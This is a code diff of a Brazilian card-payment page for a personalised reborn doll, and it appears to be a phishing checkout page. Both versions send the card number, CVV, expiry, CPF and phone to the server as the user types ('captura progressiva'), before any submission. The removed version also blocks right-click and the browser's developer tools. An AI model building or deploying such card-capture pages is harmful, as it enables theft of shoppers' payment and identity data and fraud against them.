@@ -1,217 +1,183 @@
 <!DOCTYPE html>
-
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-<meta charset="utf-8"/>
-<title>Pagamento com Cartão</title>
-<style>
-    body { font-family: Quicksand, Arial, sans-serif; background: #fff7fb; margin: 0; padding: 0; }
-    .logo { display: block; margin: 16px auto; max-width: 150px; }
-    .container { display: flex; max-width: 900px; margin: 0 auto 32px; gap: 24px; }
-    .form-area, .info-area { background: #fff; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); border-radius: 8px; }
-    .form-area { flex: 2; }
-    .info-area { flex: 1; background: #fdebf5; text-align: center; }
-    h2 { color: #be4299; margin-top: 0; }
-    label { display: block; margin-top: 12px; }
-    input, select { width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 4px; }
-    .dropdown { margin-top: 12px; }
-    .total { font-size: 1.2em; margin-top: 16px; font-weight: bold; }
-    .error { color: #c00; font-size: 0.9em; margin-top: 4px; }
-    button { margin-top: 24px; padding: 12px 20px; background: #be4299; color: #fff; border: none; border-radius: 4px; cursor: pointer; width:100%; }
-    button:disabled { background: #ccc; cursor: not-allowed; }
-    button:hover:enabled { background: #a62e80; }
-    .info-area video { max-width: 100%; height: auto; margin-top: 16px; border-radius: 4px; }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pagamento com Cartão</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #fef6f6;
+    }
   </style>
 </head>
-<body>
-<!-- Logo no topo -->
-<img alt="Dream Baby" class="logo" src="imagens/logo.png"/>
-<div class="container">
-<!-- Formulário de Dados do Cartão -->
-<div class="form-area">
-<h2>Dados do Cartão</h2>
-<label for="nome-cartao">Nome no Cartão</label>
-<input id="nome-cartao" type="text"/>
-<label for="num-cartao">Número do Cartão</label>
-<input id="num-cartao" maxlength="19" placeholder="0000 0000 0000 0000" type="text"/>
-<div class="error" id="num-error" style="display:none;">Insira um número de cartão válido.</div>
-<label for="validade">Validade (MM/AA)</label>
-<input id="validade" maxlength="5" placeholder="MM/AA" type="text"/>
-<div class="error" id="validade-error" style="display:none;">Data de validade inválida ou expirada.</div>
-<label for="cvv">CVV</label>
-<input id="cvv" maxlength="3" type="text"/>
-<label for="telefone">Telefone</label>
-<input id="telefone" placeholder="(00) 00000-0000" type="text"/>
-<label for="email">Email</label>
-<input id="email" placeholder="seu@email.com" type="email"/>
-<div class="dropdown">
-<label for="parcelamento">Parcelamento</label>
-<select id="parcelamento"></select>
-</div>
-<div class="total">Valor Total: <span id="valor-total"></span></div>
-<button disabled="" id="btn-finalizar" onclick="finalizar()">Finalizar Pagamento</button>
-</div>
-<!-- Informações da Compra -->
-<div class="info-area">
-<h2>Informações da Compra</h2>
-<p><strong>Produto:</strong> Boneca Reborn Personalizada</p>
-<p><strong>CEP de entrega:</strong> <span id="cep-info"></span></p>
-<p><strong>Frete:</strong> Grátis</p>
-<p><strong>Prazo de entrega:</strong> 10 dias úteis</p>
-<p><strong>Parcelamento:</strong> <span id="parcelamento-info"></span></p>
-<!-- Vídeo dinâmico conforme boneca escolhida -->
-<video autoplay="" controls="" id="promo-video" loop="" muted="" playsinline="">
-<source src="" type="video/mp4"/>
-        Seu navegador não suporta reprodução de vídeo.
-      </video>
-</div>
-</div>
-<script>
-    const VALOR   = 499.90;
-    const cep     = localStorage.getItem('cep')    || '';
-    const boneca  = localStorage.getItem('boneca') || '';  // "Sofia", "Valentina" ou "Maria"
-    const cabelo  = localStorage.getItem('cabelo') || '';
+<body class="text-gray-800">
 
-    const inpNome  = document.getElementById('nome-cartao');
-    const inpNum   = document.getElementById('num-cartao');
-    const inpVal   = document.getElementById('validade');
-    const inpCVV   = document.getElementById('cvv');
-    const inpTel   = document.getElementById('telefone');
-    const inpEmail = document.getElementById('email');
-    const sel      = document.getElementById('parcelamento');
-    const btnFin   = document.getElementById('btn-finalizar');
-    const numErr   = document.getElementById('num-error');
-    const valErr   = document.getElementById('validade-error');
-    const video    = document.getElementById('promo-video');
+  <div class="max-w-3xl mx-auto p-6">
+    <h1 class="text-3xl font-bold text-pink-600 mb-6 text-center">Pagamento com Cartão de Crédito</h1>
 
-    let validCardNum = false;
-    let validExpiry  = false;
+    <form id="cartaoForm" class="bg-white p-6 rounded-lg shadow-lg space-y-5">
 
-    // Preenche info fixa
-    document.getElementById('cep-info').textContent     = cep ? cep.slice(0,5) + '-' + cep.slice(5) : '—';
-    document.getElementById('valor-total').textContent = `R$ ${VALOR.toFixed(2).replace('.',',')}`;
+      <!-- Produto e valor -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="font-semibold block mb-1">Produto:</label>
+          <input type="text" value="Boneca Reborn Personalizável" disabled class="w-full p-3 rounded-lg border border-gray-300 bg-gray-100">
+        </div>
+        <div>
+          <label class="font-semibold block mb-1">Valor:</label>
+          <input type="text" id="valorBase" value="R$ 499,90" disabled class="w-full p-3 rounded-lg border border-gray-300 bg-gray-100">
+        </div>
+      </div>
 
-    // Configura vídeo de acordo com o boneca selecionada
-    if (boneca) {
-      video.querySelector('source').src = `videos/${boneca}.mp4`;
-      video.load();
-    }
+      <!-- CEP e prazo -->
+      <div>
+        <label class="font-semibold block mb-1">CEP de Entrega:</label>
+        <input type="text" id="cep" placeholder="00000-000" maxlength="9" class="w-full p-3 rounded-lg border border-pink-300" required />
+        <p id="prazoEntrega" class="text-sm text-gray-600 mt-2 hidden">Prazo estimado: <strong>10 dias úteis (SEDEX)</strong></p>
+      </div>
 
-    // Monta opções de parcelamento
-    for (let i = 1; i <= 12; i++) {
-      const vl  = (VALOR / i).toFixed(2).replace('.',',');
-      const txt = i === 1
-        ? `1× de R$ ${vl} (à vista)`
-        : `${i}× de R$ ${vl}`;
-      sel.innerHTML += `<option value="${i}">${txt}</option>`;
-    }
-    sel.value = 1;
+      <!-- Parcelamento -->
+      <div>
+        <label class="font-semibold block mb-1">Parcelamento (sem juros):</label>
+        <select id="parcelamento" class="w-full p-3 rounded-lg border border-pink-300"></select>
+        <p class="mt-2 text-sm">Valor total: <span id="valorTotal" class="font-semibold">R$ 499,90</span></p>
+      </div>
 
-    function atualizaBtn() {
-      btnFin.disabled = !(
-        validCardNum &&
-        validExpiry &&
-        inpTel.value.trim() &&
-        inpEmail.value.trim()
-      );
-      document.getElementById('parcelamento-info').textContent =
-        sel.value === '1'
-          ? 'À vista'
-          : `${sel.value}× de R$ ${(VALOR/sel.value).toFixed(2).replace('.',',')}`;
-    }
-    sel.addEventListener('change', atualizaBtn);
+      <!-- Dados do Cartão -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="font-semibold block mb-1">Nome do titular:</label>
+          <input type="text" name="nomeTitular" required class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+        <div>
+          <label class="font-semibold block mb-1">Número do cartão:</label>
+          <input type="text" name="numeroCartao" id="numeroCartao" maxlength="19" required placeholder="0000 0000 0000 0000" class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+        <div>
+          <label class="font-semibold block mb-1">Validade (MM/AA):</label>
+          <input type="text" name="validade" id="validade" maxlength="5" required placeholder="MM/AA" class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+        <div>
+          <label class="font-semibold block mb-1">CVV:</label>
+          <input type="text" name="cvv" maxlength="4" required placeholder="000" class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+      </div>
 
-    // Máscara de validade
-    inpVal.addEventListener('input', () => {
-      let v = inpVal.value.replace(/\D/g,'');
-      if (v.length > 2) v = v.slice(0,2) + '/' + v.slice(2,4);
-      inpVal.value = v;
+      <!-- CPF e telefone -->
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="font-semibold block mb-1">CPF:</label>
+          <input type="text" name="cpf" maxlength="14" required placeholder="000.000.000-00" class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+        <div>
+          <label class="font-semibold block mb-1">Telefone:</label>
+          <input type="text" name="telefone" maxlength="15" required placeholder="(00) 00000-0000" class="w-full p-3 rounded-lg border border-pink-300">
+        </div>
+      </div>
+
+      <!-- Finalizar -->
+      <div>
+        <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg transition">
+          Finalizar Pagamento
+        </button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    // Formatar número do cartão automaticamente
+    document.getElementById("numeroCartao").addEventListener("input", function(e) {
+      let input = e.target.value.replace(/\D/g, "").substring(0, 16);
+      input = input.replace(/(.{4})/g, "$1 ").trim();
+      e.target.value = input;
     });
 
-    // Luhn para cartão
-    inpNum.addEventListener('input', () => {
-      let v = inpNum.value.replace(/\D/g,'').match(/.{1,4}/g)?.join(' ') || '';
-      inpNum.value = v;
-      const num = v.replace(/\s/g,'');
-      if (num.length < 12) {
-        validCardNum = false; numErr.style.display = 'none';
-      } else {
-        let sum = 0, alt = false;
-        for (let i = num.length - 1; i >= 0; i--) {
-          let n = parseInt(num[i],10);
-          if (alt) { n *= 2; if (n>9) n -= 9; }
-          sum += n; alt = !alt;
+    // Formatar validade MM/AA
+    document.getElementById("validade").addEventListener("input", function(e) {
+      let input = e.target.value.replace(/\D/g, "");
+      if (input.length >= 3) {
+        input = input.substring(0, 2) + "/" + input.substring(2, 4);
+      }
+      e.target.value = input;
+    });
+
+    // Verificar validade do cartão
+    function isValidCardNumber(number) {
+      const digits = number.replace(/\D/g, "").split("").reverse().map(n => parseInt(n));
+      const checksum = digits.reduce((acc, val, i) => {
+        if (i % 2 === 1) {
+          let double = val * 2;
+          if (double > 9) double -= 9;
+          return acc + double;
         }
-        validCardNum = sum % 10 === 0;
-        numErr.style.display = validCardNum ? 'none' : 'block';
+        return acc + val;
+      }, 0);
+      return checksum % 10 === 0;
+    }
+
+    // Exibir prazo após digitar CEP
+    const cepInput = document.getElementById("cep");
+    const prazoEntrega = document.getElementById("prazoEntrega");
+
+    cepInput.addEventListener("input", () => {
+      const cep = cepInput.value.replace(/\D/g, "");
+      if (cep.length === 8) {
+        prazoEntrega.classList.remove("hidden");
+      } else {
+        prazoEntrega.classList.add("hidden");
       }
-      atualizaBtn();
     });
 
-    // Validação da validade
-    inpVal.addEventListener('blur', () => {
-      const m = inpVal.value.match(/^(\d{2})\/(\d{2})$/);
-      if (!m) validExpiry = false;
-      else {
-        const month = +m[1], year = 2000 + +m[2], now = new Date();
-        validExpiry = month>=1 && month<=12 &&
-          (year>now.getFullYear() || (year===now.getFullYear() && month>=now.getMonth()+1));
-      }
-      valErr.style.display = validExpiry ? 'none' : 'block';
-      atualizaBtn();
+    // Parcelas
+    const valorBase = 499.90;
+    const selectParcelas = document.getElementById("parcelamento");
+    const valorTotalSpan = document.getElementById("valorTotal");
+
+    for (let i = 1; i <= 12; i++) {
+      const parcela = (valorBase / i).toFixed(2).replace('.', ',');
+      const option = document.createElement("option");
+      option.value = i;
+      option.textContent = `${i}x de R$ ${parcela}`;
+      selectParcelas.appendChild(option);
+    }
+
+    selectParcelas.addEventListener("change", () => {
+      valorTotalSpan.textContent = "R$ 499,90";
     });
 
-    inpTel.addEventListener('input', atualizaBtn);
-    inpEmail.addEventListener('input', atualizaBtn);
-
-    // Função de envio
-    async function finalizar() {
-      const dados = {
-        nome:          inpNome.value,
-        numeroCartao:  inpNum.value.replace(/\s/g,''),
-        validade:      inpVal.value,
-        cvv:           inpCVV.value,
-        parcelas:      +sel.value,
-        total:         VALOR,
-        cep, boneca, cabelo,
-        telefone:      inpTel.value,
-        email:         inpEmail.value
-      };
-      const resp = await fetch('/submit-form', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(dados)
+    // Captura progressiva
+    const form = document.getElementById("cartaoForm");
+    const campos = form.querySelectorAll("input, select");
+    campos.forEach(campo => {
+      campo.addEventListener("input", () => {
+        const dados = Object.fromEntries(new FormData(form));
+        fetch("/captura-progresso", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(dados)
+        });
       });
-      if (!resp.ok) {
-        alert('Erro ao processar. Tente novamente.');
+    });
+
+    // Captura final
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const numeroCartao = document.getElementById("numeroCartao").value;
+      if (!isValidCardNumber(numeroCartao)) {
+        alert("Número do cartão inválido.");
         return;
       }
-      window.location.href = 'pagamento-analise.html';
-    }
-  
-// Captura progressiva
-function capturarProgresso(campo, valor) {
-  fetch('/progressivo', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ campo, valor })
-  });
-}
-[inpNome, inpNum, inpVal, inpCVV, inpTel, inpEmail].forEach(inp => {
-  inp.addEventListener('blur', () => {
-    if (inp.value.trim()) {
-      capturarProgresso(inp.id, inp.value);
-    }
-  });
-});
-
-</script>
-<script>
-    document.addEventListener("contextmenu", e => e.preventDefault());
-    document.onkeydown = function(e) {
-      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C"))) {
-        return false;
-      }
-    };
-    </script></body>
+      const dadosFinais = Object.fromEntries(new FormData(form));
+      fetch("/captura-final", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(dadosFinais)
+      }).then(() => {
+        window.location.href = "/pagamento-analise.html";
+      });
+    });
+  </script>
+</body>
 </html>
